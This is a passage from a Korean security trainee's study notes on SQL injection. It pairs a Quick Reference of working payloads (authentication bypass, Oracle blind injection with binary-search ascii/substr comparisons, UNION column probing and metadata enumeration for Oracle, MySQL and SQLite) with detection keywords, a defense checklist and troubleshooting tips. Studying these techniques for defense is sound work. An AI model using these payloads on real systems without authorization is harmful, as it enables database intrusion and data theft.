- **이진 탐색의 효율성:** Blind SQL Injection에서 ASCII 코드를 하나씩 비교하는 것보다 이진 탐색을 사용하면 log2(127) ≈ 7번의 비교로 문자를 특정할 수 있어 훨씬 효율적임을 확인했습니다.

### 이전 학습과의 연결고리

- **Day 62 웹 보안 기초와 연계:** 기본 SQL Injection 개념을 바탕으로 Union-based, Blind 등 고급 기법으로 확장할 수 있었습니다. 특히 HTTP 요청-응답 구조 이해가 Blind SQL Injection 분석에 큰 도움이 되었습니다.
- **SIEM 로그 분석 관점 추가:** Wazuh, Splunk에서 Blind SQL Injection 패턴을 탐지하려면 동일 IP의 반복 요청, length/substr/ascii 함수 사용 패턴을 찾아야 함을 알게 되었습니다.
- **침해사고 대응 시나리오 구체화:** SQL Injection 탐지 시 초기 대응 절차(세션 차단 → IP 블랙리스트 → 침해 범위 분석)를 더욱 구체적으로 수립할 수 있게 되었습니다.

### 실무 적용 아이디어

**보안 전문가 관점:**
- **SIEM 고급 탐지 룰 작성:** Blind SQL Injection의 이진 탐색 패턴(동일 IP에서 > 연산자를 이용한 반복 요청)을 탐지하는 Custom Rule을 Wazuh나 Splunk에 작성할 수 있겠습니다.
- **침해사고 대응 플레이북 업데이트:** SQL Injection 유형별(Union-based, Blind, Error-based) 대응 절차를 세분화하여 침해사고 대응 매뉴얼에 반영해야겠습니다.
- **정기 취약점 점검 강화:** 웹 애플리케이션의 모든 검색 기능, 로그인 기능에 대해 Blind SQL Injection 테스트를 추가로 수행하고, 참/거짓 응답 차이를 최소화하는 개선안을 제시할 수 있겠습니다.

**보안 컨설턴트 관점:**
- **고객사 진단 시 Blind SQL Injection 점검 추가:** 화면에 쿼리 결과가 직접 노출되지 않더라도 Blind SQL Injection 취약점이 존재할 수 있으므로, 참/거짓 응답 차이를 확인하는 테스트를 필수로 포함해야겠습니다.
- **개발자 교육 자료 개선:** Prepared Statement의 중요성뿐만 아니라 에러 메시지 필터링, 응답 차이 최소화 등의 방어 기법도 함께 교육해야겠습니다.

---

## 7. Quick Reference

### SQL Injection 공격 명령어 모음

```sql
# 기본 인증 우회
' or '1'='1' --
' or '1'='1' /*
admin' --
admin' #

# OR 조건을 이용한 우회 (주석 차단 시)
z_answer@eqst.com' or '1' ='2
z_answer@eqst.com' or 'a' ='b

# 주석 처리 (Oracle)
-- (한 줄 주석, 뒤에 공백 필요)
/* 여러 줄 주석 */

# 주석 처리 (MySQL)
-- (한 줄 주석, 뒤에 공백 필요)
# (한 줄 주석, URL 인코딩: %23)
/* 여러 줄 주석 */

# Blind SQL Injection (Oracle)
# 길이 확인
test%' and length(user)=4 and '1%'='1

# ASCII 값 비교 (이진 탐색)
test%' and (select ascii(substr(user,1,1)) from dual) > 83 and '1%'='1
test%' and (select ascii(substr(user,1,1)) from dual) = 73 and '1%'='1

# Union SQL Injection 컬럼 개수 파악
' order by 1 --
' order by 5 --
' order by 10 --  (에러 발생 시 컬럼 개수 확인)

# Union 자료형 테스트
' union select null,null,null,null,null from dual --
' union select 'a','b','c','d','e' from dual --

# Oracle 메타데이터 조회
' union select table_name,null,null,null,null from user_tables where 'q%'='q
' union select column_name,null,null,null,null from user_tab_columns where table_name='테이블명' and 'q%'='q

# MySQL 메타데이터 조회
' union select table_name,'2','3','4','5' from information_schema.tables where table_schema=database() #
' union select column_name,'2','3','4','5' from information_schema.columns where table_name='테이블명' #

# SQLite 메타데이터 조회
' UNION SELECT 1,2,3,4,tbl_name FROM sqlite_master WHERE type='table'--
' UNION SELECT 1,2,3,4,sql FROM sqlite_master WHERE type='table' AND tbl_name='테이블명'--
```

### DBMS별 핵심 차이점 요약표

| 구분 | Oracle | MySQL | SQLite | 실무 탐지 키워드 |
|:---:|:---|:---|:---|:---|
| **메타데이터** | user_tables, user_tab_columns | information_schema.tables | sqlite_master | 로그에서 이 키워드 탐지 시 즉시 알림 |
| **주석** | `--`, `/* */` | `--`, `#`, `/* */` | `--`, `/* */` | URL에 `%23` (# 인코딩) 포함 시 의심 |
| **자료형 검증** | 엄격 | 느슨 | 매우 느슨 | Oracle은 ORA-01790 에러 빈발 |
| **행 제한** | ROWNUM | LIMIT | LIMIT | Blind SQL Injection에서 단일 행 추출 용도 |
| **Blind 함수** | length(), substr(), ascii() | length(), substring(), ascii() | length(), substr(), unicode() | 반복 사용 시 Blind SQL Injection 의심 |

### SQL Injection 방어 체크리스트

**개발 단계:**
- [ ] 모든 사용자 입력값에 Prepared Statement 적용
- [ ] 입력값 화이트리스트 검증 (허용된 문자만 통과)
- [ ] 입력값 길이 제한 설정
- [ ] SQL 쿼리 로깅 활성화 (디버깅 및 분석용)
- [ ] 참/거짓 응답 차이 최소화 (Blind SQL Injection 방어)

**인프라 단계:**
- [ ] WAF 룰셋 적용 (SQL Injection 패턴 차단)
- [ ] IPS/IDS 시그니처 업데이트
- [ ] DB 계정 권한 최소화 (SELECT, INSERT, UPDATE, DELETE만 허용)
- [ ] 메타데이터 조회 권한 제거
- [ ] Rate Limiting 설정 (Blind SQL Injection 이진 탐색 차단)

**운영 단계:**
- [ ] 에러 메시지 상세 정보 노출 차단 (일반화된 에러 페이지만 표시)
- [ ] SIEM에서 SQL Injection 탐지 룰 생성 및 알림 설정
- [ ] Blind SQL Injection 패턴 탐지 룰 추가
- [ ] 정기 웹 애플리케이션 취약점 스캐닝
- [ ] 침해사고 대응 매뉴얼 수립 (SQL Injection 탐지 시 절차)

---

## 8. 트러블슈팅

| 문제 | 원인 | 해결 방법 |
|:---|:---|:---|
| Union 쿼리 실행 시 ORA-01789 에러 | 컬럼 개수 불일치 | - `ORDER BY` 절로 원본 쿼리의 컬럼 개수 정확히 파악<br>- Union 쿼리의 SELECT 항목 개수를 원본과 동일하게 맞춤<br>- `null` 값으로 부족한 컬럼 채우기 |
| Union 쿼리 실행 시 ORA-01790 에러 | 자료형 불일치 | - 먼저 모든 컬럼을 `null`로 설정하여 실행<br>- 하나씩 문자형 (`'a'`), 숫자형 (`1`), 날짜형 (`SYSDATE`)으로 변경하며 테스트<br>- MySQL은 자료형 검증이 느슨하므로 Oracle보다 수월 |
| Blind SQL Injection 시 응답 차이 없음 | 참/거짓 응답이 동일하게 처리됨 | - 다른 응답 차이 확인 (페이지 크기, 응답 시간 등)<br>- Time-based SQL Injection으로 전환<br>- 다른 입력란에서 시도 |
| SQLite에서 테이블 구조 파악 어려움 | 메타데이터 조회 방법 모름 | - `sqlite_master` 테이블의 `sql` 컬럼 조회<br>- 한 번의 쿼리로 전체 CREATE TABLE 구문 확인 가능<br>- `' union select sql from sqlite_master --` |
| Blind SQL Injection이 너무 느림 | 한 글자씩 순차적으로 비교 | - 이진 탐색 알고리즘 사용<br>- 자동화 스크립트 작성<br>- 병렬 처리로 여러 글자 동시 추출 |

---

**Today's Insight:**

SQL Injection은 단순한 키워드 삽입 공격이 아니라, 데이터베이스의 동작 원리와 쿼리 문법을 정확히 이해해야 성공할 수 있는 고도화된 기법입니다. 특히 오늘 학습한 Blind SQL Injection은 쿼리 결과가 직접 노출되지 않는 환경에서도 참/거짓 차이만으로 데이터를 추출할 수 있다는 점에서 매우 위협적입니다. 이진 탐색 알고리즘을 활용하면 효율적으로 데이터를 추출할 수 있으며, 이는 공격자 관점에서도 방어자 관점에서도 중요한 지식입니다. 보안 전문가로서 가장 중요한 교훈은 '사용자 입력값을 절대 신뢰하지 말라'와 'Prepared Statement 사용만으로 대부분의 SQL Injection을 차단할 수 있다'는 점입니다. 또한 에러 메시지 필터링, 참/거짓 응답 차이 최소화, Rate Limiting 등 다층 방어 전략이 필수적임을 깨달았습니다. 앞으로 침해사고 대응 시 로그 패턴 분석을 통해 공격 기법을 역추적하고, SIEM 탐지 룰을 지속적으로 개선해야겠습니다.